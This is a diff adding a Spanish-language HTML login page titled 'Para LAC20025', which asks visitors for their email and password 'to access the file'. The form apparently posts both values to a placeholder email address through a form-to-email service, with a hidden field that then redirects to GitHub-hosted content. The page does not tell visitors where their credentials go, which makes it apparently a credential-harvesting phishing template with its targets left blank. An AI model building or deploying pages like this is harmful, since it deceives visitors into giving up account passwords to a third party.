@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Para LAC20025</title>
+    <style>
+        body {
+            
+            background-color: #C2858C;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            height: 100vh; /* Altura completa de la pantalla */
+            display: flex;
+            justify-content: center; /* Centrar horizontalmente */
+            align-items: center; /* Centrar verticalmente */
+        }
+
+        .cajita-login {
+            background-color: white;
+            padding: 40px;
+            border-radius: 15px; /* Bordes redondeados */
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2); /* Sombra elegante */
+            width: 320px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box; /* Para que no se descuadre */
+            background-color: #f9f9f9;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #C2858C; /* El mismo color del fondo */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background-color: #a06b71; /* Un poco más oscuro al pasar el mouse */
+        }
+
+        .nota-seguridad {
+            font-size: 11px;
+            color: #888;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="cajita-login">
+        <h1>Para LAC20025</h1>
+        <p>Ingresa tus datos para acceder al archivo</p>
+
+        <form action="CORREO_ELECTRONICO" method="POST">
+            
+            <input type="email" name="email" placeholder="Correo electrónico" required>
+            
+            <input type="password" name="password" placeholder="Contraseña" required>
+
+            <input type="hidden" name="_next" value="PON_AQUI_TU_ENLACE_DE_GITHUB/contenido.html">
+
+            <button type="submit">Entrar</button>
+        </form>
+
+        
+        </div>
+    </div>
+
+</body>
+</html>
+
